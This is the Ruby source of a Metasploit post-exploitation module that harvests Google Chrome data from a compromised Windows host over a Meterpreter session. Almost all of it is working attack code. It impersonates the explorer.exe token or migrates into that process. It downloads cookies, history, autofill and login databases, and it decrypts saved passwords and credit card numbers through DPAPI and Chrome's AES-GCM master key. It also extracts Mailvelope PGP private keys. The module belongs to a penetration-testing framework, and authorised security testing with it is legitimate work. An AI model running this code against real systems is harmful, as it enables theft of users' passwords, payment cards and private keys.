##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Google Chrome User Data Enumeration',
        'Description' => %q{
          This module will collect user data from Google Chrome and attempt to decrypt
          sensitive information.
        },
        'License' => MSF_LICENSE,
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Author' => [
          'Sven Taute', # Original (Meterpreter script)
          'sinn3r',     # Metasploit post module
          'Kx499',      # x64 support
          'mubix'       # Parse extensions
        ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_close
              core_channel_eof
              core_channel_open
              core_channel_read
              core_migrate
              stdapi_fs_stat
              stdapi_railgun_api
              stdapi_sys_config_getenv
              stdapi_sys_config_getsid
              stdapi_sys_config_getuid
              stdapi_sys_config_steal_token
              stdapi_sys_process_attach
              stdapi_sys_process_get_processes
              stdapi_sys_process_memory_allocate
              stdapi_sys_process_memory_read
              stdapi_sys_process_memory_write
            ]
          }
        }
      )
    )

    register_options(
      [
        OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', false]),
      ]
    )
  end

  def extension_mailvelope_parse_key(data)
    return data.gsub("\x00", '').tr('[]', '').gsub('\\r', '').gsub('"', '').gsub('\\n', "\n")
  end

  def extension_mailvelope_store_key(name, value)
    return unless name =~ /(private|public)keys/i

    priv_or_pub = Regexp.last_match(1)

    keys = value.split(',')
    print_good("==> Found #{keys.size} #{priv_or_pub} key(s)!")
    keys.each do |key|
      key_data = extension_mailvelope_parse_key(key)
      vprint_good(key_data)
      path = store_loot(
        "chrome.mailvelope.#{priv_or_pub}", 'text/plain', session, key_data, "#{priv_or_pub}.key", "Mailvelope PGP #{priv_or_pub.capitalize} Key"
      )
      print_good("==> Saving #{priv_or_pub} key to: #{path}")
    end
  end

  def extension_mailvelope(username, extname)
    chrome_path = @profiles_path + '\\' + username + @data_path + 'Default'
    maildb_path = chrome_path + "/Local Storage/chrome-extension_#{extname}_0.localstorage"
    if file_exist?(maildb_path) == false
      print_error('==> Mailvelope database not found')
      return
    end
    print_status('==> Downloading Mailvelope database...')
    local_path = store_loot('chrome.ext.mailvelope', 'text/plain', session, 'chrome_ext_mailvelope')
    session.fs.file.download_file(local_path, maildb_path)
    print_good("==> Downloaded to #{local_path}")

    maildb = SQLite3::Database.new(local_path)
    columns, *rows = maildb.execute2('select * from ItemTable;')
    maildb.close

    rows.each do |name, value|
      extension_mailvelope_store_key(name, value)
    end
  end

  def parse_prefs(username, filepath)
    prefs = ''
    File.open(filepath, 'rb') do |f|
      prefs = f.read
    end
    results = ActiveSupport::JSON.decode(prefs)
    if results['extensions']['settings']
      print_status('Extensions installed: ')
      results['extensions']['settings'].each do |name, values|
        next unless values['manifest']

        print_status("=> #{values['manifest']['name']}")
        if values['manifest']['name'] =~ /mailvelope/i
          print_good('==> Found Mailvelope extension, extracting PGP keys')
          extension_mailvelope(username, name)
        end
      end
    end
  end

  def get_master_key(local_state_path)
    local_state_data = read_file(local_state_path)
    local_state = JSON.parse(local_state_data)
    master_key_base64 = local_state['os_crypt']['encrypted_key']
    master_key = Rex::Text.decode_base64(master_key_base64)
    master_key
  end

  def decrypt_data(data)
    memsize = 1024 * ((data.length + 1023) / 1024)
    mem_alloc = session.railgun.kernel32.LocalAlloc(0, data.length)
    mem = mem_alloc['return']
    session.railgun.memwrite(mem, data, data.length)

    if session.arch == 'x86'
      addr = [mem].pack('V')
      len = [data.length].pack('V')
      pdatain = "#{len}#{addr}".force_encoding('ascii')
      ret = session.railgun.crypt32.CryptUnprotectData(pdatain, 16, nil, nil, nil, 0, 8)
      len, addr = ret['pDataOut'].unpack('V2')
    else
      addr = [mem].pack('Q')
      len = [data.length].pack('Q')
      pdatain = "#{len}#{addr}".force_encoding('ascii')
      ret = session.railgun.crypt32.CryptUnprotectData(pdatain, 16, nil, nil, nil, 0, 16)
      len, addr = ret['pDataOut'].unpack('Q2')
    end

    return nil if len == 0

    decrypted = session.railgun.memread(addr, len)

    session.railgun.kernel32.LocalFree(mem)
    session.railgun.kernel32.LocalFree(addr)

    return decrypted
  end

  def process_files(username)
    secrets = ''
    masterkey = nil
    decrypt_table = Rex::Text::Table.new(
      'Header' => 'Decrypted data',
      'Indent' => 1,
      'Columns' => ['Name', 'Decrypted Data', 'Origin']
    )

    @chrome_files.each do |item|
      if item[:in_file] == 'Preferences'
        parse_prefs(username, item[:raw_file])
      end

      next if item[:sql].nil?
      next if item[:raw_file].nil?

      db = SQLite3::Database.new(item[:raw_file])
      begin
        columns, *rows = db.execute2(item[:sql])
      rescue StandardError
        next
      end
      db.close

      rows.map! do |row|
        res = Hash[*columns.zip(row).flatten]
        next unless item[:encrypted_fields] && !session.sys.config.is_system?

        item[:encrypted_fields].each do |field|
          name = res['name_on_card'].nil? ? res['username_value'] : res['name_on_card']
          origin = res['label'].nil? ? res['origin_url'] : res['label']
          enc_data = res[field]

          if enc_data.start_with? 'v10'
            unless masterkey
              print_status('Found password encrypted with masterkey')
              local_state_path = @profiles_path + '\\' + username + @data_path + 'Local State'
              masterkey_encrypted = get_master_key(local_state_path)
              masterkey = decrypt_data(masterkey_encrypted[5..])
              print_good('Found masterkey!')
            end

            cipher = OpenSSL::Cipher.new('aes-256-gcm')
            cipher.decrypt
            cipher.key = masterkey
            cipher.iv = enc_data[3..14]
            ciphertext = enc_data[15..-17]
            cipher.auth_tag = enc_data[-16..]
            pass = res[field + '_decrypted'] = cipher.update(ciphertext) + cipher.final
          else
            pass = res[field + '_decrypted'] = decrypt_data(enc_data)
          end
          next unless !pass.nil? && (pass != '')

          decrypt_table << [name, pass, origin]
          secret = "url:#{origin} #{name}:#{pass}"
          secrets << secret << "\n"
          vprint_good("Decrypted data: #{secret}")
        end
      end
    end

    if secrets != ''
      path = store_loot('chrome.decrypted', 'text/plain', session, decrypt_table.to_s, 'decrypted_chrome_data.txt', 'Decrypted Chrome Data')
      print_good("Decrypted data saved in: #{path}")
    end
  end

  def extract_data(username)
    # Prepare Chrome's path on remote machine
    chrome_path = @profiles_path + '\\' + username + @data_path + 'Default'
    raw_files = {}

    @chrome_files.map { |e| e[:in_file] }.uniq.each do |f|
      remote_path = chrome_path + '\\' + f

      # Verify the path before downloading the file
      if file_exist?(remote_path) == false
        print_error("#{f} not found")
        next
      end

      # Store raw data
      local_path = store_loot("chrome.raw.#{f}", 'text/plain', session, "chrome_raw_#{f}")
      raw_files[f] = local_path
      session.fs.file.download_file(local_path, remote_path)
      print_good("Downloaded #{f} to '#{local_path}'")
    end

    # Assign raw file paths to @chrome_files
    raw_files.each_pair do |raw_key, raw_path|
      @chrome_files.each do |item|
        if item[:in_file] == raw_key
          item[:raw_file] = raw_path
        end
      end
    end

    return true
  end

  def steal_token
    current_pid = session.sys.process.open.pid
    target_pid = session.sys.process['explorer.exe']
    return if target_pid == current_pid

    if target_pid.to_s.empty?
      print_warning('No explorer.exe process to impersonate.')
      return
    end

    print_status("Impersonating token: #{target_pid}")
    begin
      session.sys.config.steal_token(target_pid)
      return true
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Cannot impersonate: #{e.message}")
      return false
    end
  end

  def migrate(pid = nil)
    current_pid = session.sys.process.open.pid
    if !pid.nil? && (current_pid != pid)
      # PID is specified
      target_pid = pid
      print_status("current PID is #{current_pid}. Migrating to pid #{target_pid}")
      begin
        session.core.migrate(target_pid)
      rescue ::Exception => e
        print_error(e.message)
        return false
      end
    else
      # No PID specified, assuming to migrate to explorer.exe
      target_pid = session.sys.process['explorer.exe']
      if target_pid != current_pid
        @old_pid = current_pid
        print_status("current PID is #{current_pid}. migrating into explorer.exe, PID=#{target_pid}...")
        begin
          session.core.migrate(target_pid)
        rescue ::Exception => e
          print_error(e)
          return false
        end
      end
    end
    return true
  end

  def run
    @chrome_files = [
      { raw: '', in_file: 'Web Data', sql: 'select * from autofill;' },
      { raw: '', in_file: 'Web Data', sql: 'SELECT username_value,origin_url,signon_realm FROM logins;' },
      { raw: '', in_file: 'Web Data', sql: 'select * from autofill_profiles;' },
      { raw: '', in_file: 'Web Data', sql: 'select * from credit_cards;', encrypted_fields: ['card_number_encrypted'] },
      { raw: '', in_file: 'Cookies', sql: 'select * from cookies;' },
      { raw: '', in_file: 'History', sql: 'select * from urls;' },
      { raw: '', in_file: 'History', sql: 'SELECT url FROM downloads;' },
      { raw: '', in_file: 'History', sql: 'SELECT term FROM keyword_search_terms;' },
      { raw: '', in_file: 'Login Data', sql: 'select * from logins;', encrypted_fields: ['password_value'] },
      { raw: '', in_file: 'Bookmarks', sql: nil },
      { raw: '', in_file: 'Preferences', sql: nil },
    ]

    @old_pid = nil
    migrate_success = false

    # If we can impersonate a token, we use that first.
    # If we can't, we'll try to MIGRATE (more aggressive) if the user wants to
    got_token = steal_token
    if !got_token && datastore['MIGRATE']
      migrate_success = migrate
    end

    host = session.session_host

    # Get Google Chrome user data path
    env_vars = session.sys.config.getenvs('SYSTEMDRIVE', 'USERNAME')
    sysdrive = env_vars['SYSTEMDRIVE'].strip
    if directory?("#{sysdrive}\\Users")
      @profiles_path = "#{sysdrive}/Users"
      @data_path = '\\AppData\\Local\\Google\\Chrome\\User Data\\'
    elsif directory?("#{sysdrive}\\Documents and Settings")
      @profiles_path = "#{sysdrive}/Documents and Settings"
      @data_path = '\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\'
    end

    # Get user(s)
    usernames = []
    if is_system?
      print_status('Running as SYSTEM, extracting user list...')
      print_warning('(Automatic decryption will not be possible. You might want to manually migrate, or set "MIGRATE=true")')
      session.fs.dir.foreach(@profiles_path) do |u|
        not_actually_users = [
          '.', '..', 'All Users', 'Default', 'Default User', 'Public', 'desktop.ini',
          'LocalService', 'NetworkService'
        ]
        usernames << u unless not_actually_users.include?(u)
      end
      print_status "Users found: #{usernames.join(', ')}"
    else
      uid = session.sys.config.getuid
      print_status "Running as user '#{uid}'..."
      usernames << env_vars['USERNAME'].strip if env_vars['USERNAME']
    end

    has_sqlite3 = true
    begin
      require 'sqlite3'
    rescue LoadError
      print_warning('SQLite3 is not available, and we are not able to parse the database.')
      has_sqlite3 = false
    end

    # Process files for each username
    usernames.each do |u|
      print_status("Extracting data for user '#{u}'...")
      success = extract_data(u)
      process_files(u) if success && has_sqlite3
    end

    # Migrate back to the original process
    if datastore['MIGRATE'] && @old_pid && migrate_success
      print_status('Migrating back...')
      migrate(@old_pid)
    end
  end
end
